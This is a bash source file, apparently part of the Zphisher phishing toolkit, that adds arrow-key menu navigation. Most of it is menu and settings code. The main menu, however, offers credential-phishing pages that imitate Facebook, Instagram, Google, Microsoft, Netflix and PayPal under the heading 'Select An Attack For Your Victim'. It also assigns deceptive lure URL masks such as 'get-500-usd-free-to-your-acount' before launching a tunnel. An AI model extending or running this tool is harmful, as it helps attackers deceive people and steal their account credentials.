#!/bin/bash

##   Zphisher - Interactive Menu System
##   Arrow Key Navigation Support
##   Version: 1.0.0

## Interactive Menu State
INTERACTIVE_MENU_SELECTION=0

## Enable/Disable Interactive Mode
INTERACTIVE_MODE=${INTERACTIVE_MODE:-true}

## Get Key Press
get_key() {
    local key
    IFS= read -r -n1 -t1 key 2>/dev/null || key=""
    echo "$key"
}

## Process Arrow Keys
process_arrow_key() {
    local key="$1"
    case "$key" in
        $'\x1b')
            read -r -n1 -t0.1 key 2>/dev/null || key=""
            read -r -n1 -t0.1 key 2>/dev/null || key=""
            case "$key" in
                'A') echo "UP" ;;
                'B') echo "DOWN" ;;
                'C') echo "RIGHT" ;;
                'D') echo "LEFT" ;;
                *) echo "UNKNOWN" ;;
            esac
            ;;
        'k'|'K'|'w'|'W')
            echo "UP"
            ;;
        'j'|'J'|'s'|'S')
            echo "DOWN"
            ;;
        'q'|'Q')
            echo "EXIT"
            ;;
        '')
            echo "ENTER"
            ;;
        *)
            echo "UNKNOWN"
            ;;
    esac
}

## Draw Interactive Menu
draw_interactive_menu() {
    local title="$1"
    shift
    local options=("$@")
    local total=${#options[@]}
    
    { clear; banner_small; echo; }
    echo -e "${CYAN}[ Use ARROW KEYS or W/S to navigate, ENTER to select, Q to quit ]${WHITE}\n"
    echo -e "${ORANGE}$title${WHITE}\n"
    
    for i in "${!options[@]}"; do
        local idx=$((i + 1))
        local display_idx=$(printf "%02d" "$idx")
        
        if [[ $i -eq $INTERACTIVE_MENU_SELECTION ]]; then
            echo -e "  ${GREEN}► ${WHITE}${options[$i]}"
        else
            echo -e "    ${options[$i]}"
        fi
    done
    
    echo -e "\n${CYAN}Selection: ${GREEN}[$((INTERACTIVE_MENU_SELECTION + 1))/${total}]${WHITE}"
}

## Run Interactive Main Menu
run_interactive_main_menu() {
    local options=(
        "Facebook      - Social Network Phishing"
        "Instagram     - Photo Sharing Phishing"
        "Google        - Gmail/Account Phishing"
        "Microsoft     - Email Phishing"
        "Netflix       - Streaming Phishing"
        "Paypal        - Payment Phishing"
        "Settings      - Theme & Options"
        "About         - Tool Information"
        "Exit          - Quit Zphisher"
    )
    
    INTERACTIVE_MENU_SELECTION=0
    
    while true; do
        draw_interactive_menu "${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}" "${options[@]}"
        
        local key
        key=$(get_key)
        local action=$(process_arrow_key "$key")
        
        case "$action" in
            "UP")
                ((INTERACTIVE_MENU_SELECTION--))
                [[ $INTERACTIVE_MENU_SELECTION -lt 0 ]] && INTERACTIVE_MENU_SELECTION=$((${#options[@]} - 1))
                ;;
            "DOWN")
                ((INTERACTIVE_MENU_SELECTION++))
                [[ $INTERACTIVE_MENU_SELECTION -ge ${#options[@]} ]] && INTERACTIVE_MENU_SELECTION=0
                ;;
            "ENTER")
                case $INTERACTIVE_MENU_SELECTION in
                    0) site_facebook; return ;;
                    1) site_instagram; return ;;
                    2) site_gmail; return ;;
                    3) website="microsoft"; mask='https://unlimited-onedrive-space-for-free'; tunnel_menu; return ;;
                    4) website="netflix"; mask='https://upgrade-your-netflix-plan-free'; tunnel_menu; return ;;
                    5) website="paypal"; mask='https://get-500-usd-free-to-your-acount'; tunnel_menu; return ;;
                    6) settings_menu; return ;;
                    7) about; return ;;
                    8) msg_exit; return ;;
                esac
                ;;
            "EXIT")
                msg_exit
                return
                ;;
        esac
    done
}

## Settings Menu
settings_menu() {
    local options=(
        "Change Theme  - Select CLI Color Theme"
        "Toggle Mode   - Switch Interactive/Classic"
        "Back          - Return to Main Menu"
    )
    
    INTERACTIVE_MENU_SELECTION=0
    
    while true; do
        { clear; banner_small; echo; }
        echo -e "${CYAN}[ Use ARROW KEYS to navigate, ENTER to select ]${WHITE}\n"
        echo -e "${ORANGE}[ Settings Menu ]${WHITE}\n"
        
        for i in "${!options[@]}"; do
            if [[ $i -eq $INTERACTIVE_MENU_SELECTION ]]; then
                echo -e "  ${GREEN}► ${WHITE}${options[$i]}"
            else
                echo -e "    ${options[$i]}"
            fi
        done
        
        local key
        key=$(get_key)
        local action=$(process_arrow_key "$key")
        
        case "$action" in
            "UP")
                ((INTERACTIVE_MENU_SELECTION--))
                [[ $INTERACTIVE_MENU_SELECTION -lt 0 ]] && INTERACTIVE_MENU_SELECTION=$((${#options[@]} - 1))
                ;;
            "DOWN")
                ((INTERACTIVE_MENU_SELECTION++))
                [[ $INTERACTIVE_MENU_SELECTION -ge ${#options[@]} ]] && INTERACTIVE_MENU_SELECTION=0
                ;;
            "ENTER")
                case $INTERACTIVE_MENU_SELECTION in
                    0) theme_menu; return ;;
                    1) toggle_interactive_mode; return ;;
                    2) run_interactive_main_menu; return ;;
                esac
                ;;
        esac
    done
}

## Toggle Interactive Mode
toggle_interactive_mode() {
    if [[ "$INTERACTIVE_MODE" == "true" ]]; then
        INTERACTIVE_MODE="false"
        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Interactive mode disabled. Using classic menu.${WHITE}"
    else
        INTERACTIVE_MODE="true"
        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Interactive mode enabled.${WHITE}"
    fi
    save_settings
    sleep 1.5
}

## Save Settings
save_settings() {
    cat > "${BASE_DIR}/.settings" <<- EOF
		INTERACTIVE_MODE=$INTERACTIVE_MODE
		CURRENT_THEME=$CURRENT_THEME
	EOF
}

## Load Settings
load_settings() {
    if [[ -f "${BASE_DIR}/.settings" ]]; then
        source "${BASE_DIR}/.settings"
    fi
}

## Is Interactive Mode Enabled
is_interactive_enabled() {
    [[ "$INTERACTIVE_MODE" == "true" ]]
}

## Is running in terminal
is_tty() {
    [[ -t 1 ]]
}

## Loading Animation
loading_animation() {
    local message="$1"
    local duration=${2:-2}
    local chars=("⠋" "⠙" "⠹" "⠸" "⠼" "⠴" "⠦" "⠧" "⠇" "⠃")
    
    echo -ne "${CYAN}${message} ${WHITE}"
    local end_time=$((SECONDS + duration))
    while [[ $SECONDS -lt $end_time ]]; do
        for char in "${chars[@]}"; do
            echo -ne "\b\b\b${GREEN}${char}${WHITE}"
            sleep 0.1
        done
    done
    echo -ne "\b\b\b${GREEN}✓${WHITE}   \n"
}
